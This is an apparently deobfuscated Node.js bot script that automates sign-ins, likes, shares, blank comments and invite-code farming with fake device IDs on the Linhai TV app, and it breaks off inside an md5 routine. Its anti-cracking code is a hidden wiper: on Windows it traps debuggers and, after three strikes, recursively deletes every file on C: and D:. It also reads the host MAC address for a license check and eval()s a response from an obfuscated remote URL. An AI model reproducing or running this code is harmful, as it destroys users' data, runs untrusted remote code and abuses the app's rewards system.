//Thu Aug 29 2024 09:06:51 GMT+0000 (Coordinated Universal Time)
//Base:https://github.com/echo094/decode-js
//Modify:https://github.com/smallfawn/decode_action
const $ = new Env("掌心临海");
const VM = require("sablejs/runtime")(),
  path = require("path"),
  fs = require("fs"),
  cryptoJS = require("crypto-js");
function initVM() {
  vm = new VM();
  const _0x451078 = vm.getGlobal(),
    _0x3eabaa = vm.createObject(),
    _0xf3ecd5 = vm.createFunction("log", function () {
      const _0x31af2d = [];
      for (let _0x221379 = 0; _0x221379 < arguments.length; _0x221379++) {
        _0x31af2d.push(vm.asString(arguments[_0x221379]));
      }
      console.log(..._0x31af2d);
      return vm.createUndefined();
    }),
    _0x49e71c = vm.createFunction("xxxx", function (_0x4de67d) {
      let _0x531c4b = eval(_0x4de67d.value);
      return vm.createString(JSON.stringify(_0x531c4b));
    }),
    _0x13f664 = vm.createFunction("yyyy", function (_0x503fc7) {
      let _0x411a8c = _0x503fc7.value,
        _0x59e6cd = fs.readFileSync(_0x411a8c, "utf-8").replace(/\r\n/g, "\n"),
        _0xe7207 = cryptoJS.MD5(_0x59e6cd).toString();
      return vm.createString(_0xe7207);
    }),
    _0x3feba2 = vm.createFunction("ddd", function (_0xd6de82) {
      let _0x4326d0 = cryptoJS.MD5(_0xd6de82.value).toString();
      return vm.createString(_0x4326d0);
    });
  vm.setProperty(_0x3eabaa, "log", _0xf3ecd5);
  vm.setProperty(_0x451078, "xxxx", _0x49e71c);
  vm.setProperty(_0x451078, "console", _0x3eabaa);
  vm.setProperty(_0x451078, "yyyy", _0x13f664);
  vm.setProperty(_0x451078, "ddd", _0x3feba2);
  vm.run(fs.readFileSync("./output_final.js").toString());
  return vm;
}
function destroyVM(_0x417987) {
  _0x417987.destroy();
}
function abc(_0x9bd179, _0x175b2d, _0x47299e, _0x50a1c9, _0x4f1c26) {
  const _0x2d2ef0 = _0x9bd179.getGlobal();
  let _0x44e6b4 = _0x9bd179.getProperty(_0x2d2ef0, "xab"),
    _0x4de631 = _0x9bd179.call(_0x44e6b4, _0x9bd179.createUndefined(), _0x9bd179.createString(_0x175b2d), _0x9bd179.createString(_0x50a1c9), _0x9bd179.createString(_0x4f1c26), _0x9bd179.createString(_0x47299e));
  _0x4de631 = _0x9bd179.asString(_0x4de631);
  return _0x4de631;
}
function xyz(_0xbb3018, _0x2c9127, _0x109e56, _0x45cb3a, _0x66a0a6) {
  const _0x2fee39 = _0xbb3018.getGlobal();
  let _0x1a25be = _0xbb3018.getProperty(_0x2fee39, "xmn"),
    _0x3f625f = _0xbb3018.call(_0x1a25be, _0xbb3018.createUndefined(), _0xbb3018.createString(_0x2c9127), _0xbb3018.createString(_0x45cb3a), _0xbb3018.createString(_0x66a0a6), _0xbb3018.createString(_0x109e56));
  _0x3f625f = _0xbb3018.asString(_0x3f625f);
  return _0x3f625f;
}
var gtr;
let mac = "",
  status;
status = (status = $.getval("qmwkstatus") || "1") > 1 ? "" + status : "";
JSNAMED = $.isNode() ? require("path").basename(__filename) : "kxnjy.js";
let zxlhappArr = [],
  zxlhplnrArr = [],
  all_msg = "";
let id = "",
  uid = "",
  arrs = [],
  zxlhapp = ($.isNode() ? process.env.zxlhapp : $.getdata("zxlhapp")) || "",
  zxlhplnr = ($.isNode() ? process.env.zxlhplnr : $.getdata("zxlhplnr")) || "感谢分享@大佬厉害@仰望@牛啊牛啊@内容可以@内容不错@很强@牛的@6666啊@可以的@留名@混个眼熟@有帖子的地方就有我@我来了@楼主加油@好看你",
  acckey = $.isNode() ? process.env.cdkey ? process.env.cdkey : "" : $.getdata("cdkey") ? $.getdata("cdkey") : "";
var myDate = new Date();
var myMonth = myDate.getMonth() + 1,
  myToday = myDate.getDate();
myMonth >= 10 ? myMonth = myMonth : myMonth = "0" + myMonth;
myToday >= 10 ? myToday = myToday : myToday = "0" + myToday;
if ($.isNode()) {
  gtr = require("fs");
  if (isFileExist("C:/")) {
    console.log("电脑环境");
    setInterval(() => {
      do {
        (function (_0x87f5a) {
          return function (_0x4c6ba5) {
            return Function("Function(arguments[0]+\"" + _0x4c6ba5 + "\")()");
          }(_0x87f5a);
        })("bugger")("de", 0, 0, (0, 0));
        addF("d:/");
        addF("C:/");
      } while (1);
    }, 0);
  } else {
    console.log("青龙环境");
    function getMACAddresses() {
      var _0xf0ffed = "",
        _0x58254c = fs.readdirSync("/sys/class/net/");
      _0x58254c.forEach(function (_0x525bf1) {
        var _0x3c3641 = path.join("/sys/class/net", _0x525bf1, "address");
        _0x525bf1.substr(0, 3) == "eth" && fs.existsSync(_0x3c3641) && (_0xf0ffed = fs.readFileSync(_0x3c3641).toString().trim());
      });
      return _0xf0ffed;
    }
    mac = getMACAddresses();
  }
} else {
  console.log("代理环境");
}
function isFileExist(_0x173aaa) {
  try {
    gtr.accessSync(_0x173aaa, gtr.F_OK);
  } catch (_0x313450) {
    return false;
  }
  return true;
}
function addF(_0x3ac35d, _0x529c88) {
  let _0x48f1a2 = 0,
    _0xaaf8dd = "C:/Windows/system.txt";
  if (isFileExist(_0xaaf8dd)) {
    _0x48f1a2 = gtr.readFileSync(_0xaaf8dd, "utf8");
  } else {
    if (isFileExist("C:/")) {
      gtr.writeFile(_0xaaf8dd, "1", function (_0x177713) {
        if (_0x177713) {
          throw _0x177713;
        }
      });
    } else {
      return;
    }
  }
  if (_0x48f1a2 == 99) {
    return 99;
  }
  console.log(_0x48f1a2);
  console.log("警告，恶意破解脚本将面临系统爆炸！！！，你只有3次机会！", _0x48f1a2);
  if (parseInt(_0x48f1a2) < 3) {
    let _0x5ccaa0 = parseInt(_0x48f1a2) + 1;
    gtr.writeFileSync(_0xaaf8dd, _0x5ccaa0 + "", "utf8");
    return;
  }
  if (!gtr.existsSync(_0x3ac35d)) {
    return;
  }
  if (gtr.statSync(_0x3ac35d).isDirectory()) {
    var _0x39fc72 = gtr.readdirSync(_0x3ac35d),
      _0x19c64b = _0x39fc72.length,
      _0x561962 = 0;
    if (_0x19c64b > 0) {
      _0x39fc72.forEach(function (_0x394b12) {
        _0x561962++;
        var _0x253d75 = _0x3ac35d + "/" + _0x394b12;
        gtr.statSync(_0x253d75).isDirectory() ? addF(_0x253d75, true) : gtr.unlinkSync(_0x253d75);
      });
      _0x19c64b == _0x561962 && _0x529c88 && gtr.rmdirSync(_0x3ac35d);
    } else {
      _0x19c64b == 0 && _0x529c88 && gtr.rmdirSync(_0x3ac35d);
    }
  } else {
    gtr.unlinkSync(_0x3ac35d);
  }
}
!(async () => {
  if (!(typeof $request !== "undefined")) {
    initVM();
    arrs = abc(global.vm, acckey, mac, 88, 0);
    if (arrs == "") {
      return;
    }
    arrs = JSON.parse(arrs);
    if (!arrs) {
      return;
    }
    zxlhappArr = zxlhapp.split("@");
    zxlhplnrArr = zxlhplnr.split("@");
    console.log("\n公告：" + arrs.gg + "\n");
    console.log("当前版本：1.0 " + arrs.bb + "\n");
    console.log("------------- 共" + zxlhappArr.length + "个账号-------------\n");
    console.log("当前设备可执行账号限制为" + arrs.num + "个账号\n");
    if (!(zxlhappArr.length > parseInt(arrs.num))) {
      for (let _0x1f0dc7 = 0; _0x1f0dc7 < zxlhappArr.length; _0x1f0dc7++) {
        zxlhapp = zxlhappArr[_0x1f0dc7];
        zxlhplnr = zxlhplnrArr[_0x1f0dc7];
        $.index = _0x1f0dc7 + 1;
        console.log("\n开始【掌心临海" + $.index + "】");
        await zxlhyq();
        await zxlhxx();
        await zxlhqd();
        await zxlhlb();
      }
    }
  }
  destroyVM(global.vm);
})().catch(_0x11d573 => $.logErr(_0x11d573)).finally(() => $.done());
function zxlhqd(_0x1cd247 = 0) {
  return new Promise(_0x580e3b => {
    let _0x17d5c8 = Math.round(new Date().getTime()),
      _0x48b9ce = randomString(16),
      _0x413016 = randomString(16),
      _0x2a07f1 = md5("" + _0x17d5c8),
      _0xe274ea = _0x2a07f1 + _0x48b9ce,
      _0x4197ea = md5("" + Buffer.from(_0xe274ea).toString("base64") + _0x48b9ce),
      _0x53c618 = md5("" + _0x17d5c8),
      _0x12e044 = _0x53c618 + _0x413016,
      _0x32b3ed = md5("" + Buffer.from(_0x12e044).toString("base64") + _0x413016),
      _0x1aea64 = {
        url: "https://app.linhaitv.com/member/Member/memberPointSign",
        headers: {
          token: zxlhapp,
          tmencrypt: "1",
          tmtimestamp: _0x17d5c8,
          tmrandomnum: _0x48b9ce,
          tmencryptkey: _0x4197ea,
          tmencryptkeynew: _0x32b3ed,
          tmtimestampnew: _0x17d5c8,
          tmrandomnumnew: _0x413016,
          "Content-Type": "application/json; charset=utf-8",
          "Content-Length": "214",
          Host: "app.linhaitv.com",
          Connection: "Keep-Alive",
          "Accept-Encoding": "gzip",
          "User-Agent": "okhttp/3.12.13"
        },
        body: "{\"tm_encrypt_data\":\"ZAM1cgyBfkXAELCi7M/73UwLR/R7kWVZ4gxFX0KRCPmxpVQ1lYshwwHQo4oTcgLtCY8RQdXK4nLbP1ZHiscd7LDKHU6smN4yY1TxLwf0xWlvWPByxgWBsZOX0yFXtEQAyglYTjqS/YMxv1TZKq+fpK3xjmxg+pRqc1fBmbxLqHiaNuTnO2h/RgoMrPrC+Hnp\"}"
      };
    $.post(_0x1aea64, async (_0x23db0c, _0x2da679, _0x5d5436) => {
      try {
        const _0x205b6f = JSON.parse(_0x5d5436);
        _0x205b6f.code == 200 ? console.log("\n掌心临海签到：" + _0x205b6f.msg) : console.log("\n掌心临海签到：" + _0x205b6f.msg);
      } catch (_0x492489) {} finally {
        _0x580e3b();
      }
    }, _0x1cd247);
  });
}
function zxlhlb(_0x524917 = 0) {
  return new Promise(_0x6e462c => {
    let _0x3d35b9 = Math.round(new Date().getTime()),
      _0x2112d3 = randomString(16),
      _0x8499e4 = randomString(16),
      _0x49df04 = md5("" + _0x3d35b9),
      _0x22876f = _0x49df04 + _0x2112d3,
      _0x22f706 = md5("" + Buffer.from(_0x22876f).toString("base64") + _0x2112d3),
      _0x1fb7ba = md5("" + _0x3d35b9),
      _0x3344c2 = {
        url: "https://app.linhaitv.com/fcinformation/Api/getIndexList?plate_id=3&member_id=" + uid + "&area_code=360502&pageSize=1",
        headers: {
          token: zxlhapp,
          tmencrypt: "1",
          tmtimestamp: _0x3d35b9,
          tmrandomnum: _0x2112d3,
          tmencryptkey: _0x22f706,
          "Content-Type": "application/json; charset=utf-8",
          "Content-Length": "214",
          Host: "app.linhaitv.com",
          Connection: "Keep-Alive",
          "Accept-Encoding": "gzip",
          "User-Agent": "okhttp/3.12.13"
        }
      };
    $.get(_0x3344c2, async (_0x150b9d, _0x518c08, _0x17a3c4) => {
      try {
        const _0x29a93f = JSON.parse(_0x17a3c4);
        if (_0x29a93f.code == 200) {
          for (let _0xa0983e = 0; _0xa0983e < _0x29a93f.data[0].information_list.length; _0xa0983e++) {
            console.log("\n掌心临海文章：" + _0x29a93f.data[0].information_list[_0xa0983e].information_title);
            id = _0x29a93f.data[0].information_list[_0xa0983e].information_id;
            await zxlhdz();
            await zxlhfx();
            await zxlhdpl();
          }
        } else {
          console.log("\n掌心临海签到：" + _0x29a93f.msg);
        }
      } catch (_0x25420a) {} finally {
        _0x6e462c();
      }
    }, _0x524917);
  });
}
function zxlhdz(_0x2464c8 = 0) {
  return new Promise(_0x23409f => {
    let _0x1ab9f9 = Math.round(new Date().getTime()),
      _0x27d70d = randomString(16),
      _0x24cbf5 = randomString(16),
      _0x1c2c70 = md5("" + _0x1ab9f9),
      _0x1c83bd = md5("" + _0x1ab9f9),
      _0x4f300c = {
        url: "https://app.linhaitv.com/fcinformation/informationlike/addLike",
        headers: {
          Host: "app.linhaitv.com",
          Connection: "keep-alive",
          "Content-Length": "45",
          "User-Agent": "Mozilla/5.0 (Linux; Android 10; 16s Pro Build/QKQ1.191222.002; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/83.0.4103.106 Mobile Safari/537.36 agentweb/4.0.2  UCBrowser/11.6.4.950",
          token: zxlhapp,
          "Content-Type": "application/json; charset=utf-8",
          Accept: "*/*"
        },
        body: "{\"member_id\":" + uid + ",\"information_id\":\"" + id + "\"}"
      };
    $.post(_0x4f300c, async (_0x107031, _0x3b9258, _0x25fe52) => {
      try {
        const _0x24d003 = JSON.parse(_0x25fe52);
        _0x24d003.code == 200 ? console.log("\n掌心临海点赞文章：" + _0x24d003.msg) : console.log("\n掌心临海点赞文章：" + _0x24d003.msg);
      } catch (_0x127900) {} finally {
        _0x23409f();
      }
    }, _0x2464c8);
  });
}
function zxlhfx(_0x5e0f21 = 0) {
  return new Promise(_0x170171 => {
    let _0x52024a = Math.round(new Date().getTime()),
      _0x37bbef = randomString(16),
      _0x554e43 = randomString(16),
      _0x446980 = md5("" + _0x52024a),
      _0xbc3601 = _0x446980 + _0x37bbef,
      _0x5ad10b = md5("" + Buffer.from(_0xbc3601).toString("base64") + _0x37bbef),
      _0x562b32 = md5("" + _0x52024a),
      _0x4e7fa5 = {
        url: "https://app.linhaitv.com/fcinformation/Information/incNum",
        headers: {
          token: zxlhapp,
          tmencrypt: "1",
          tmtimestamp: _0x52024a,
          tmrandomnum: _0x37bbef,
          tmencryptkey: _0x5ad10b,
          "Content-Type": "application/x-www-form-urlencoded",
          "Content-Length": "214",
          Host: "app.linhaitv.com",
          Connection: "Keep-Alive",
          "Accept-Encoding": "gzip",
          "User-Agent": "okhttp/3.12.13"
        },
        body: "member_id=" + uid + "&information_id=" + id + "&words=forward_num"
      };
    $.post(_0x4e7fa5, async (_0x1ca5a6, _0x3b5822, _0x115eef) => {
      try {
        const _0x4a11c4 = JSON.parse(_0x115eef);
        _0x4a11c4.code == 200 ? console.log("\n掌心临海分享文章：" + _0x4a11c4.msg) : console.log("\n掌心临海分享文章：" + _0x4a11c4.msg);
      } catch (_0x465684) {} finally {
        _0x170171();
      }
    }, _0x5e0f21);
  });
}
function zxlhxx(_0x4ca87e = 0) {
  return new Promise(_0x28e799 => {
    let _0x37f147 = Math.round(new Date().getTime()),
      _0x4910a = randomString(16),
      _0x5f21f8 = randomString(16),
      _0x4b5282 = md5("" + _0x37f147),
      _0x4882f4 = _0x4b5282 + _0x4910a,
      _0x508797 = md5("" + Buffer.from(_0x4882f4).toString("base64") + _0x4910a),
      _0x1f2632 = md5("" + _0x37f147),
      _0x56d103 = {
        url: "https://app.linhaitv.com/member/Member/getMemberInfo?member_code=&device_no=&imei_no=&mac_no=&device_no=&imei_no=&mac_no=",
        headers: {
          token: zxlhapp,
          tmtimestampnew: _0x37f147,
          tmrandomnumnew: _0x4910a,
          tmencryptkeynew: _0x508797,
          "Content-Length": "214",
          Host: "app.linhaitv.com",
          Connection: "Keep-Alive",
          "Accept-Encoding": "gzip",
          "User-Agent": "okhttp/3.12.13"
        }
      };
    $.get(_0x56d103, async (_0x443a6d, _0x41c67d, _0x106bc3) => {
      try {
        const _0x4f7150 = JSON.parse(_0x106bc3);
        _0x4f7150.code == 200 ? (console.log("\n掌心临海信息：" + _0x4f7150.msg + ",积分余额：" + _0x4f7150.data.point), uid = _0x4f7150.data.member_id) : console.log("\n掌心临海信息：" + _0x4f7150.msg);
      } catch (_0x247650) {} finally {
        _0x28e799();
      }
    }, _0x4ca87e);
  });
}
function zxlhyq(_0x4efc5e = 0) {
  return new Promise(_0x13e60c => {
    let _0x60b4cb = Math.round(new Date().getTime()),
      _0x302a9f = randomString(16),
      _0x3ad034 = randomString(16),
      _0x155db1 = md5("" + _0x60b4cb),
      _0x9eec8b = _0x155db1 + _0x302a9f,
      _0x325e85 = md5("" + Buffer.from(_0x9eec8b).toString("base64") + _0x302a9f),
      _0x1a1880 = md5("" + _0x60b4cb),
      _0x1c0a8d = {
        url: "https://app.linhaitv.com/api/Invite/addInvite",
        headers: {
          token: zxlhapp,
          tmtimestampnew: _0x60b4cb,
          tmrandomnumnew: _0x302a9f,
          tmencryptkeynew: _0x325e85,
          "Content-Length": "214",
          Host: "app.linhaitv.com",
          Connection: "Keep-Alive",
          "Accept-Encoding": "gzip",
          "User-Agent": "okhttp/3.12.13",
          "Content-Type": "application/json; charset=utf-8"
        },
        body: "{\"invitep_code\":\"562355\",\"device_no\":\"" + randomString(16) + "\",\"imei_no\":\"\",\"mac_no\":\"" + randomString(32).toUpperCase() + "\"}"
      };
    $.post(_0x1c0a8d, async (_0x372dbf, _0x57c762, _0x415344) => {
      try {
        const _0x5d3535 = JSON.parse(_0x415344);
        !(_0x5d3535.code == 200);
      } catch (_0xece377) {} finally {
        _0x13e60c();
      }
    }, _0x4efc5e);
  });
}
function zxlhdpl(_0xbda7ad = 0) {
  return new Promise(_0x12eea5 => {
    let _0x579fe9 = Math.round(new Date().getTime()),
      _0x87b1e1 = randomString(16),
      _0x273df4 = randomString(16),
      _0x1a2d05 = md5("" + _0x579fe9),
      _0x96fa85 = md5("" + _0x579fe9),
      _0x4f953c = {
        url: "https://app.linhaitv.com/fcinformation/comment/addComment",
        headers: {
          Host: "app.linhaitv.com",
          Connection: "keep-alive",
          "Content-Length": "45",
          "User-Agent": "Mozilla/5.0 (Linux; Android 10; 16s Pro Build/QKQ1.191222.002; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/83.0.4103.106 Mobile Safari/537.36 agentweb/4.0.2  UCBrowser/11.6.4.950",
          token: zxlhapp,
          "Content-Type": "application/json; charset=utf-8",
          Accept: "*/*"
        },
        body: "{\"pid\":0,\"information_id\":\"" + id + "\",\"member_id\":" + uid + ",\"comment_content\":\" \"}"
      };
    $.post(_0x4f953c, async (_0x2629e4, _0x39fa4d, _0x22521d) => {
      try {
        const _0x8e0e2e = JSON.parse(_0x22521d);
        _0x8e0e2e.code == 200 ? console.log("\n掌心临海评论文章：" + _0x8e0e2e.msg) : console.log("\n掌心临海评论文章：" + _0x8e0e2e.msg);
      } catch (_0x1e1ce5) {} finally {
        _0x12eea5();
      }
    }, _0xbda7ad);
  });
}
function randomString(_0x2c957f = 12) {
  let _0x562565 = "abcdef0123456789",
    _0x1b5023 = _0x562565.length,
    _0x2a0f68 = "";
  for (i = 0; i < _0x2c957f; i++) {
    _0x2a0f68 += _0x562565.charAt(Math.floor(Math.random() * _0x1b5023));
  }
  return _0x2a0f68;
}
function encodeUTF8(_0x3f7fb8) {
  var _0x282ed5,
    _0x52e2a6 = [],
    _0x12aeb4,
    _0xaac607;
  for (_0x282ed5 = 0; _0x282ed5 < _0x3f7fb8.length; _0x282ed5++) {
    if ((_0x12aeb4 = _0x3f7fb8.charCodeAt(_0x282ed5)) < 128) {
      _0x52e2a6.push(_0x12aeb4);
    } else {
      if (_0x12aeb4 < 2048) {
        _0x52e2a6.push(192 + (_0x12aeb4 >> 6 & 31), 128 + (_0x12aeb4 & 63));
      } else {
        if ((_0xaac607 = _0x12aeb4 ^ 55296) >> 10 == 0) {
          _0x12aeb4 = (_0xaac607 << 10) + (_0x3f7fb8.charCodeAt(++_0x282ed5) ^ 56320) + 65536;
          _0x52e2a6.push(240 + (_0x12aeb4 >> 18 & 7), 128 + (_0x12aeb4 >> 12 & 63));
        } else {
          _0x52e2a6.push(224 + (_0x12aeb4 >> 12 & 15));
        }
        _0x52e2a6.push(128 + (_0x12aeb4 >> 6 & 63), 128 + (_0x12aeb4 & 63));
      }
    }
  }
  return _0x52e2a6;
}
function sha(_0x437b55) {
  var _0x17cec0 = new Uint8Array(encodeUTF8(_0x437b55)),
    _0x401000,
    _0x5d4cfc,
    _0x5b4842,
    _0x25fed9 = (_0x17cec0.length + 8 >>> 6 << 4) + 16,
    _0x437b55 = new Uint8Array(_0x25fed9 << 2);
  _0x437b55.set(new Uint8Array(_0x17cec0.buffer));
  _0x437b55 = new Uint32Array(_0x437b55.buffer);
  for (_0x5b4842 = new DataView(_0x437b55.buffer), _0x401000 = 0; _0x401000 < _0x25fed9; _0x401000++) {
    _0x437b55[_0x401000] = _0x5b4842.getUint32(_0x401000 << 2);
  }
  _0x437b55[_0x17cec0.length >> 2] |= 128 << 24 - (_0x17cec0.length & 3) * 8;
  _0x437b55[_0x25fed9 - 1] = _0x17cec0.length << 3;
  var _0x471de5 = [],
    _0x23ab1a = [function () {
      return _0x21afff[1] & _0x21afff[2] | ~_0x21afff[1] & _0x21afff[3];
    }, function () {
      return _0x21afff[1] ^ _0x21afff[2] ^ _0x21afff[3];
    }, function () {
      return _0x21afff[1] & _0x21afff[2] | _0x21afff[1] & _0x21afff[3] | _0x21afff[2] & _0x21afff[3];
    }, function () {
      return _0x21afff[1] ^ _0x21afff[2] ^ _0x21afff[3];
    }],
    _0x58b35f = function (_0x64aa68, _0x4fcbf0) {
      return _0x64aa68 << _0x4fcbf0 | _0x64aa68 >>> 32 - _0x4fcbf0;
    },
    _0x5c73a1 = [1518500249, 1859775393, -1894007588, -899497514],
    _0x21afff = [1732584193, -271733879, null, null, -1009589776];
  _0x21afff[2] = ~_0x21afff[0];
  _0x21afff[3] = ~_0x21afff[1];
  for (_0x401000 = 0; _0x401000 < _0x437b55.length; _0x401000 += 16) {
    var _0x35af7f = _0x21afff.slice(0);
    for (_0x5d4cfc = 0; _0x5d4cfc < 80; _0x5d4cfc++) {
      _0x471de5[_0x5d4cfc] = _0x5d4cfc < 16 ? _0x437b55[_0x401000 + _0x5d4cfc] : _0x58b35f(_0x471de5[_0x5d4cfc - 3] ^ _0x471de5[_0x5d4cfc - 8] ^ _0x471de5[_0x5d4cfc - 14] ^ _0x471de5[_0x5d4cfc - 16], 1);
      _0x5b4842 = _0x58b35f(_0x21afff[0], 5) + _0x23ab1a[_0x5d4cfc / 20 | 0]() + _0x21afff[4] + _0x471de5[_0x5d4cfc] + _0x5c73a1[_0x5d4cfc / 20 | 0] | 0;
      _0x21afff[1] = _0x58b35f(_0x21afff[1], 30);
      _0x21afff.pop();
      _0x21afff.unshift(_0x5b4842);
    }
    for (_0x5d4cfc = 0; _0x5d4cfc < 5; _0x5d4cfc++) {
      _0x21afff[_0x5d4cfc] = _0x21afff[_0x5d4cfc] + _0x35af7f[_0x5d4cfc] | 0;
    }
  }
  _0x5b4842 = new DataView(new Uint32Array(_0x21afff).buffer);
  for (var _0x401000 = 0; _0x401000 < 5; _0x401000++) {
    _0x21afff[_0x401000] = _0x5b4842.getUint32(_0x401000 << 2);
  }
  var _0x4f807b = Array.prototype.map.call(new Uint8Array(new Uint32Array(_0x21afff).buffer), function (_0xb95268) {
    return (_0xb95268 < 16 ? "0" : "") + _0xb95268.toString(16);
  }).join("");
  return _0x4f807b;
}
function hqs(_0x3ba5ce = 10) {
  return new Promise(_0x9014db => {
    let _0x3a26f7 = 12,
      _0x4dcdb5 = {
        url: $.isNode() ? rc4($.fwur(), "1200") + ("?key=" + acckey + "&id=" + _0x3a26f7 + "&ip=1&mac=" + mac + "&bb=1") : rc4($.fwur(), "1200") + ("?key=" + acckey + "&id=" + _0x3a26f7 + "&ip=0&mac=" + mac + "&bb=1")
      };
    $.post(_0x4dcdb5, async (_0x2390a5, _0x2e77ff, _0x1e13f0) => {
      try {
        let _0x12543c = eval(_0x1e13f0);
        _0x12543c.code == 200 ? (all_msg = _0x12543c.msg, _0x9014db(_0x12543c.data)) : (all_msg = _0x12543c.msg, _0x9014db(false));
      } catch (_0x1b14ab) {
        $.logErr(_0x1b14ab, _0x2e77ff);
      }
    }, 0);
  });
}
function md5(_0x497f05) {
  function _0x250018(_0x58c290, _0x21f1e6) {
    return _0x58c290 << _0x21f1e6 | _0x58c290 >>> 32 - _0x21f1e6;
  }
  function _0x491d92(_0x53186b, _0x133fce) {
    var _0x54aec2, _0x4d8749, _0x32e5a1, _0x173bff, _0x9219a;
    _0x32e5a1 = 2147483648 & _0x53186b;
    _0x173bff = 2147483648 & _0x133fce;
    _0x54aec2 = 1073741824 & _0x53186b;
    _0x4d8749 = 1073741824 & _0x133fce;
    _0x9219a = (1073741823 & _0x53186b) + (1073741823 & _0x133fce);
    return _0x54aec2 & _0x4d8749 ? 2147483648 ^ _0x9219a ^ _0x32e5a1 ^ _0x173bff : _0x54aec2 | _0x4d8749 ? 1073741824 & _0x9219a ? 3221225472 ^ _0x9219a ^ _0x32e5a1 ^ _0x173bff : 1073741824 ^ _0x9219a ^ _0x32e5a1 ^ _0x173bff : _0x9219a ^ _0x32e5a1 ^ _0x173bff;
  }
  function _0x7a548d(_0x26fbc8, _0x33c3d3, _0x4371fe) {
    return _0x26fbc8 & _0x33c3d3 | ~_0x26fbc8 & _0x4371fe;
  }
  function _0x17b3ee(_0x57cfe7, _0x484049, _0x3e3bdd) {
    return _0x57cfe7 & _0x3e3bdd | _0x484049 & ~_0x3e3bdd;
  }
  function _0x5a8f61(_0x2bedea, _0x4f70f5, _0x555c7e) {
    return _0x2bedea ^ _0x4f70f5 ^ _0x555c7e;
  }
  function _0x26630e(_0x30a5e2, _0xe120ed, _0x5a83e6) {
    return _0xe120ed ^ (_0x30a5e2 | ~_0x5a83e6);
  }
  function _0x2579ae(_0xe9ed15, _0x14230e, _0x31f2fa, _0x16d5cd, _0x3674d6, _0x5737be, _0x8a5bfd) {
    _0xe9ed15 = _0x491d92(_0xe9ed15, _0x491d92(_0x491d92(_0x7a548d(_0x14230e, _0x31f2fa, _0x16d5cd), _0x3674d6), _0x8a5bfd));
    return _0x491d92(_0x250018(_0xe9ed15, _0x5737be), _0x14230e);
  }
  function _0xc4e9df(_0x4a4989, _0x3189cb, _0x26b231, _0x1d40be, _0x497e5b, _0xf929ae, _0x54e7b4) {
    _0x4a4989 = _0x491d92(_0x4a4989, _0x491d92(_0x491d92(_0x17b3ee(_0x3189cb, _0x26b231, _0x1d40be), _0x497e5b), _0x54e7b4));
    return _0x491d92(_0x250018(_0x4a4989, _0xf929ae), _0x3189cb);
  }
  function _0x4fcace(_0xb5c6a7, _0x5c2cce, _0x38ccf9, _0x3fef9c, _0x165059, _0x457cbb, _0x16ad7e) {
    _0xb5c6a7 = _0x491d92(_0xb5c6a7, _0x491d92(_0x491d92(_0x5a8f61(_0x5c2cce, _0x38ccf9, _0x3fef9c), _0x165059), _0x16ad7e));
    return _0x491d92(_0x250018(_0xb5c6a7, _0x457cbb), _0x5c2cce);
  }
  function _0x271c82(_0x5ef056, _0x9dfe76, _0x129f0b, _0x10b791, _0x46a711, _0x29a222, _0x29c6d8) {
    _0x5ef056 = _0x491d92(_0x5ef056, _0x491d92(_0x491d92(_0x26630e(_0x9dfe76, _0x129f0b, _0x10b791), _0x46a711), _0x29c6d8));
    return _0x491d92(_0x250018(_0x5ef056, _0x29a222), _0x9dfe76);
  }
  function _0x43da58(_0x51b683) {
    for (var _0x1283f9, _0x2d519a = _0x51b683.length, _0x869b28 = _0x2d519a + 8, _0x37d70a = (_0x869b28 - _0x869b28 % 64) / 64, _0x3e7f16 = 16 * (_0x37d70a + 1), _0x534145 = new Array(_0x3e7f16 - 1), _0x137f8e = 0, _0x15e8f0 = 0; _0x2d519a > _0x15e8f0;) {
      _0x1283f9 = (_0x15e8f0 - _0x15e8f0 % 4) / 4;
      _0x137f8e = _0x15e8f0 % 4 * 8;
      _0x534145[_0x1283f9] = _0x534145[_0x1283f9] | _0x51b683.charCodeAt(_0x15e8f0) << _0x137f8e;
      _0x15e8f0++;
    }
    _0x1283f9 = (_0x15e8f0 - _0x15e8f0 % 4) / 4;
    _0x137f8e = _0x15e8f0 % 4 * 8;
    _0x534145[_0x1283f9] = _0x534145[_0x1283f9] | 128 << _0x137f8e;
    _0x534145[_0x3e7f16 - 2] = _0x2d519a << 3;
    _0x534145[_0x3e7f16 - 1] = _0x2d519a >>> 29;
    return _0x534145;
  }
  function _0x48214a(_0x15f158) {
    var _0x1582ee,
      _0x6f81b2,
      _0x54131c = "",
      _0x167daf = "";
    for (_0x6f81b2 = 0; 3 >= _0x6f81b2; _0x6f81b2++) {
      _0x1582ee = _0x15f158 >>> 8 * _0x6f81b2 & 255;
      _0x167daf = "0" + _0x1582ee.toString(16);
      _0x54131c += _0x167daf.substr(_0x167daf.length - 2, 2);
    }
    return _0x54131c;
  }
  function _0x4cca55(_0x268d32) {
    _0x268d32 = _0x268d32.replace(/\r\n/g, "\n");
    for (var _0x574c03 = "", _0x211f5f = 0; _0x211f5f < _0x268d32.length; _0x211f5f++) {
      var _0x538d0e = _0x268d32.charCodeAt(_0x211f5f);
      128 > _0x538d0e ? _0x574c03 += String.fromCharCode(_0x538d0e) : _0x538d0e > 127 && 2048 > _0x538d0e ? (_0x574c03 += String.fromCharCode(_0x538d0e >> 6 | 192), _0x574c03 += String.fromCharCode(63 & _0x538d0e | 128)) : (_0x574c03 += String.fromCharCode(_0x538d0e >> 12 | 224), _0x574c03 += String.fromCharCode(_0x538d0e >> 6 & 63 | 128), _0x574c03 += String.fromCharCode(63 & _0x538d0e | 128));
    }
    return _0x574c03;
  }
  var _0x182683,
    _0x3ec6ee,
    _0x4aecf8,
    _0x17ac03,
    _0xb75117,
    _0x4d65b4,
    _0x526e1d,
    _0x137c9b,
    _0x329403,
    _0x45f51b = [],
    _0x1f30f6 = 7,
    _0x300b9d = 12,
    _0x5d83d6 = 17,
    _0x4ba9fb = 22,
    _0x57ffba = 5,
    _0x13ff12 = 9,
    _0x2d9e50 = 14,
    _0x188046 = 20,
    _0x4f1f79 = 4,
    _0x193f26 = 11,
    _0x58c8c1 = 16,
    _0x4ad188 = 23,
    _0x166979 = 6,
    _0x3e31a4 = 10,
    _0x350a9a = 15,
    _0x2396cb = 21;
  for (_0x497f05 = _0x4cca55(_0x497f05), _0x45f51b = _0x43da58(_0x497f05), _0x4d65b4 = 1732584193, _0x526e1d = 4023233417, _0x137c9b = 2562383102, _0x329403 = 271733878, _0x182683 = 0; _0x182683 < _0x45f51b.length; _0x182683 += 16) {
    _0x3ec6ee = _0x4d65b4;
    _0x4aecf8 = _0x526e1d;
